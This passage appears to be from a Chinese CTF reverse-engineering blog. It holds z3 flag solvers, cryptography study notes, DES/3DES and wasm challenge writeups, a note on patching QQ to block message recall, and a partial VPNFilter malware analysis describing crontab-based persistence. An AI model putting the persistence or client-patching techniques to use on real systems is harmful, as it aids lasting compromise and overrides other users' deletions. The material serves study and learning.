class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">33</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">34</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">35</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">36</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">37</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">38</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">39</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">40</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">41</span>])<br><span class="hljs-attribute">if</span> solver.check()==sat:<br><span class="hljs-attribute">print</span> solver.model()<br></code></pre></td></tr></table></figure><p>问了下出题人顺便了解到了sage<br>学习一波</p><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><p>学习一波密码学，主要还是跟着航电的师傅博客中推荐的视频来学的<br>//后来发现有些视频没有中文字幕<br>有些简单的就不写了像什么替换密码。。。啥的</p><h2 id="代换置换密码"><a href="#代换置换密码" class="headerlink" title="代换置换密码"></a>代换置换密码</h2><h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>凯撒密码是固定的移位3。。。<br>不多说了这个很简单</p><h3 id="HILL"><a href="#HILL" class="headerlink" title="HILL"></a>HILL</h3><p>希尔密码在hgame钟遇到过<br>一个plain text attack<br>具体加密过程就是有个密钥k<br>k决定了一次性加密多少<br>加密过程就是一个k*k得矩阵与之相乘然后取表<br>解密很简单啦就是逆矩阵了</p><h3 id="Vigenere-cipher"><a href="#Vigenere-cipher" class="headerlink" title="Vigenère cipher"></a>Vigenère cipher</h3><p>维吉尼亚就是多了个密钥<br>这是第一次引进密钥。。。<br>一般密钥就是一句话<br>然后明文与密钥相加模26</p><h3 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h3><p>一个特殊的希尔密码<br>类似栅栏密码啊啥的<br>其实本质上就是矩阵相乘</p><h2 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h2><p>密码算法的安全性不取决于密码算法本身的机密性，而取决于密钥的机密<br>对密码分析的攻击方法有很多。。。这边不例举<br>简单说几个就是唯密文攻击<br>有类似字频分析攻击啊等</p><h2 id="流密码-序列密码"><a href="#流密码-序列密码" class="headerlink" title="流密码(序列密码)"></a>流密码(序列密码)</h2><p>对称密码有俩种一种是流密码还有一种就是分组密码<br>序列密码就是每次单独加密每个位<br>其中又分同步序列密码和异步序列密码<br>同步序列就是密钥与明文密文无关<br>异步就是有关<br>最经典的序列密码就是one time pad<br>具有完备安全<br>加密方式就是用与明文同样长的密钥序列与之xor</p><h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><h3 id="真随机数生成器"><a href="#真随机数生成器" class="headerlink" title="真随机数生成器"></a>真随机数生成器</h3><p>例如抛筛子啊什么的<br>这都是不可复制的<br>而一般通用的就是伪随机数生成器</p><h3 id="伪随机数生成器-PRNG"><a href="#伪随机数生成器-PRNG" class="headerlink" title="伪随机数生成器(PRNG)"></a>伪随机数生成器(PRNG)</h3><p>伪随机数生成器从一个初始种子开始通过计算来得到序列<br>最常见的例子就是线性同余生成器<br>s0 = seed<br>si+1 = a*si + b mod m , i = 0,1,…</p><h3 id="CSPRNG"><a href="#CSPRNG" class="headerlink" title="CSPRNG"></a>CSPRNG</h3><p>加密安全伪随机数生成器<br>这其实就是PRNG的一个特例<br>简单来说就是给定的钱n个密钥序列不能通过计算来得到后n个<br>成功预测的算法正确概率也不超过50%</p><h2 id="完备安全"><a href="#完备安全" class="headerlink" title="完备安全"></a>完备安全</h2><p>简单来说就是不能唯密文攻击//但可能有其他攻击方法<br>对于获取的密文c，有原文m1和m2,推出c的概率是相等的<br>但是想要完备安全 len(key) &gt;= len(m)</p><h2 id="数据加密标准与替换算法"><a href="#数据加密标准与替换算法" class="headerlink" title="数据加密标准与替换算法"></a>数据加密标准与替换算法</h2><p>主要是des<br>//以前已经了解过，现在基本识别是没有多大问题了<br>//复习一波</p><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>混淆就是一种使密钥与密文之间的关系尽可能模糊的操作。<br>现在实现混淆最常用的一个方法就是替换</p><h3 id="扩散"><a href="#扩散" class="headerlink" title="扩散"></a>扩散</h3><p>为了隐藏明文的统计属性而将一个明文符号的影响扩散到多个密文符号的操作<br>简单来说就是俩个明文，仅有一个位不同，生成的密文有平均一般的不同</p><h3 id="初始置换与逆初始置换"><a href="#初始置换与逆初始置换" class="headerlink" title="初始置换与逆初始置换"></a>初始置换与逆初始置换</h3><p>这个很简单就是对明文和密文做置换<br>俩个互逆的矩阵罢了</p><h3 id="f函数"><a href="#f函数" class="headerlink" title="f函数"></a>f函数</h3><p>des的f函数传进去R的32位。。。然后与子密钥or后进行取表<br>然后就是一堆xor啥的操作</p><h1 id="QQ消息防撤回"><a href="#QQ消息防撤回" class="headerlink" title="QQ消息防撤回"></a>QQ消息防撤回</h1><p>其实很简答<br>就是patch<br><img src="20.png" alt="20"><br>上个成果图<br>目前没出现任何异常<br>其实原理就是<br>用户发起撤回请求-&gt;服务器接收请求并删除服务器的消息记录，给用户下发命令撤回-&gt;用户接收到命令，删除本地消息<br>但是问题就是本地消息是我们可控的<br>这样就好办了<br>直接找到撤回的函数nop掉就完事了<br>库的话是IM.dll<br>x32dbg附加上去暴力搜索一通就行<br>网上也有许多相关的文章<br>这边不多说了</p><h1 id="vpnfilter"><a href="#vpnfilter" class="headerlink" title="vpnfilter"></a>vpnfilter</h1><p>vpnfilter经了解是一款很牛逼的恶意软件。。。<br>而且是最近的一款，不是什么究极远古时代病毒<br>能有幸分析这一款软件也是很开心得<br>而且有老师指导，遇到得困难基本都能解决</p><h2 id="学习目的"><a href="#学习目的" class="headerlink" title="学习目的"></a>学习目的</h2><p>驻留技术<br>vpnfilter与以前得很多软件不同就是能驻留<br>像一般的恶意软件，系统重启后就会消失，而vpnfilter不会<br>所以要学习一下这个驻留技术<br>自毁技术<br>通过烧坏主板来“毁尸灭迹”</p><h2 id="大致介绍"><a href="#大致介绍" class="headerlink" title="大致介绍"></a>大致介绍</h2><p>vpnfilter大致攻击流程图如下<br><img src="8.png" alt="8"><br>主要是由三个阶段组成<br>第一阶段就是负责启动和驻留过程并下载第二阶段且运行<br>第二阶段就是远程命令得接受与执行<br>第三阶段主要是为了扩展</p><h3 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h3><p><img src="9.png" alt="9"><br>首先是fork进程后来一波改权限<br>我这边是umask(23)和其他人分析报告的不一样。。。<br>//别人是27<br>不知道为啥<br><img src="10.png" alt="10"><br>然后是一波check<br>check自身文件是否存在，不存在的话就跳转<br>重新写入磁盘<br>然后是check_crontab<br>这主要是为了检查是否已经设置过自启动<br>如果没有的话就会设置自启动，来达到驻留<br><img src="11.png" alt="11"><br>下面这个是设置自启动<br>可以看到是fprintf(result, “*/5 * * * * %s\n”, (int)&amp;byte_808EF80);<br>每五分钟启动一次<br><img src="12.png" alt="12"></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>des算法小结</title>
    <link href="/2019/06/06/des%E7%AE%97%E6%B3%95%E5%B0%8F%E7%BB%93/"/>
    <url>/2019/06/06/des%E7%AE%97%E6%B3%95%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>des这个坑是时候填一下了<br>最近一直遇到这算法。。。<br>以后要尽量秒</p><a id="more"></a><p>先来看一下17届的面试题</p><h2 id="acdes"><a href="#acdes" class="headerlink" title="acdes"></a>acdes</h2><p>这边只展示des的部分，base不写了<br><img src="1.png" alt="1"><br>可以看到key在生成<br>进入encode<br><img src="2.png" alt="2"><br>des的密钥编排<br>一次性加密8个字节<br>上面还有补位操作<br>进入des具体循环看下<br><img src="3.png" alt="3"><br>可以看到R1被送进f函数与轮密钥一起<br>//这边应该是v5[31-i],因为我patch的缘故。。。<br>具体解密呢只需要patch就行了<br>因为是Feistel结构密钥倒着输入就是解密<br>直接patch吧v5[31-i]patch成v5[i]<br>就完事了</p><h2 id="3des"><a href="#3des" class="headerlink" title="3des"></a>3des</h2><p>以强网杯的题目来讲<br>3des其实就是三次des了，一般的话每次des的key都不一样<br><img src="4.png" alt="4"><br>可以看到这边有根据key分别生成三次des的key<br><img src="5.png" alt="5"><br>看到有补位操作后紧接着的肯定就是主角了<br>下面还有L1和R1换位操作<br>进去3des看看，可以看到传参传了3个子密钥<br><img src="6.png" alt="6"><br>这边就是正常的des了<br>连续三次<br>没什么好说的<br>以后看到能认得就行了<br>工具解一下完事</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探mips逆向</title>
    <link href="/2019/06/03/%E5%88%9D%E6%8E%A2mips%E9%80%86%E5%90%91/"/>
    <url>/2019/06/03/%E5%88%9D%E6%8E%A2mips%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>动调环境目前还没有搭起来<br>静态先走起把。。。<br>整了半天。。。</p><a id="more"></a><h2 id="Xman-babymips"><a href="#Xman-babymips" class="headerlink" title="Xman-babymips"></a>Xman-babymips</h2><p>加密比较简单<br>retdec看起来还是比较难受的。。。<br>毕竟没有优化过，虽然说反编译的都是对的<br><img src="1.png" alt="1"><br>可以看到一开始会对前5个字符进行验证<br>当然因为某些原因我搞了半天<br>比如说。。。优先级。。。<br>前五个是qctf{<br>然后进入下一步验证<br><img src="2.png" alt="2"><br>有好多/ * 操作<br>其实就是左移和右移。。。<br>没有优化过看起来就是难受</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> = &#x27;Q|j&#123;g&#x27;<br><span class="hljs-attribute">flag</span> = &#x27;&#x27;<br><span class="hljs-attribute">for</span> i in range(len(a)):<br>    <span class="hljs-attribute">flag</span> += chr(ord(a[i])^<span class="hljs-number">32</span>-i)<br><span class="hljs-attribute">b</span> =<span class="hljs-meta"> [0x52, 0xFD, 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41,</span><br><span class="hljs-meta">  0x54, 0xA0, 0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0,</span><br><span class="hljs-meta">  0x16, 0x79, 0x1A, 0x15, 0x5B, 0x75, 0x1F]</span><br><span class="hljs-attribute">x</span> = <span class="hljs-number">5</span><br><span class="hljs-attribute">for</span> i in range(len(b)):<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">128</span>):<br>        <span class="hljs-attribute">temp</span> = j<br>        <span class="hljs-attribute">temp</span> = temp^<span class="hljs-number">32</span>-x<br>        <span class="hljs-attribute">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">temp</span> = ((temp &gt;&gt; <span class="hljs-number">6</span>)&amp;<span class="hljs-number">0</span>xff)|((temp&lt;&lt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0</span>xff)<br>        <span class="hljs-attribute">if</span> x%<span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">temp</span> = ((temp &lt;&lt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0</span>xff) | ((temp &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0</span>xff)<br>        <span class="hljs-attribute">if</span> temp == b[i]:<br>            <span class="hljs-attribute">flag</span> += chr(j)<br>            <span class="hljs-attribute">x</span> += <span class="hljs-number">1</span><br>            <span class="hljs-attribute">break</span><br><span class="hljs-attribute">print</span> flag<br><span class="hljs-comment">#qctf&#123;ReA11y_4_B@89_mlp5_4_XmAn_&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qwbctf re</title>
    <link href="/2019/05/30/qwbctf-re/"/>
    <url>/2019/05/30/qwbctf-re/</url>
    
    <content type="html"><![CDATA[<p>二次自闭</p><a id="more"></a><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><p>base64后直接比较<br>可以直接下断点后看栈中的值，base在线解一下出flag</p><h2 id="just-re"><a href="#just-re" class="headerlink" title="just_re"></a>just_re</h2><p>ida打开可以发现逻辑并不复杂<br><img src="1.png" alt="1"><br>验证分为俩个<br>第二个进去什么都没<br>查看汇编可以猜出有smc的操作</p><p>先进入第一个看下<br><img src="2.png" alt="2"><br>调试可以发现主要是验证输入的前10个字符<br>把前八个转化为一个unsigned int<br>还有俩也是<br>进行一段验证操作<br>上面有一段xmmword_的看不懂但是没有关系<br>下面验证的32为足够解出答案了<br>用z3解一下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">from z3 import *<br>a = [<span class="hljs-number">659593944</span>,<span class="hljs-number">663789525</span>,<span class="hljs-number">51647302</span>,<span class="hljs-number">207884977</span>,<span class="hljs-number">4277163693</span>,<span class="hljs-number">52128309</span>,<span class="hljs-number">2387884190</span>,<span class="hljs-number">22803995</span>]<br>b = [<span class="hljs-number">608471104</span>,<span class="hljs-number">612666700</span>,<span class="hljs-number">508</span>,<span class="hljs-number">256901226</span>,<span class="hljs-number">472138769</span>,<span class="hljs-number">1005800</span>,<span class="hljs-number">2369808896</span>,<span class="hljs-number">38282372</span>]<br>s = Solver()<br>x = BitVec(&#x27;x&#x27;,<span class="hljs-number">32</span>)<br>y = BitVec(&#x27;y&#x27;,<span class="hljs-number">32</span>)<br>for i in range(len(a)):<br>    s.add(b[i] == (x + i + <span class="hljs-number">16</span>)^(<span class="hljs-number">0x1010101</span>*y + a[i]))<br>print s.check()<br>print s.model()<br></code></pre></td></tr></table></figure><p>前10个输入为<br>1324229810</p><p>过了第一个验证就可以看下第二个了<br>第二个是一个原装的3des<br>密钥可以在内存中看到<br><img src="3.png" alt="3"><br>最后验证比较的值找个网站在线解一下就出来答案了<br><img src="4.png" alt="4"><br>输入应为<br>0dcc509a6f75849b</p><p><img src="5.png" alt="5"></p><h2 id="web-assembly"><a href="#web-assembly" class="headerlink" title="web_assembly"></a>web_assembly</h2><p>wasm的逆向<br>第一次遇到还是在hgame里面<br>这次还是没有写出来<br>但起码大概知道方法了<br>首先拿到题目肯定是反编译成c么<br>用wasm2c<br>然后再次编译后用ida打开可以进行初步的静态分析<br>一般搜索字符串是发现不了的<br>用16进制编辑器打开wasm可以看到字符串都在文件的末尾<br>再结合ida静态分析后可以大概初步猜出<br>比如这题<br><img src="6.png" alt="6"><br>放进ida后可以大概看到逻辑<br>主函数call了俩<br>然后就是动态调试了<br>可以用chorme<br><img src="7.png" alt="7"><br>左边是函数窗口<br>这边我不知道怎么搜索main<br>//firefox可以<br>所以写的话可以先放进firefox里搜索一下main<br>定位是func几<br>比如这题是func16<br>然后放进chorme里找到func16就能下断点调试了<br>一般的话，这题目，主函数只有俩次call<br>就可以把断点下在俩个call上<br>调试可以发现第一个call就是录入<br>可以忽略<br>主要看第二个<br>可以看见明显的比较函数<br>还有最后的验证<br><img src="8.png" alt="8"><br>最后的验证通过看他们的偏移可以知道第一个是成功<br>第二个是失败<br>前面的话是一堆xor其实就是验证是否相等<br>加密部分是xtea<br>解一下就行了<br>需要注意的是这边都是dword<br><img src="9.png" 